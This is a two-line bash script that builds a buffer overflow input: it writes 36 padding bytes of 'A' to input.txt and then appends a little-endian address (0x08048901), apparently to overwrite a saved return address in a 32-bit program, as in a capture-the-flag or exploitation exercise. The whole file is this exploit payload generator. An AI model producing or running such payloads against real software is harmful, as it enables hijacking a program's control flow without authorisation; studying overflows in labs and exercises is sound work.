#!/bin/bash

perl -e 'print "A"x36;' > input.txt
printf "\x01\x89\x04\x08" >> input.txt
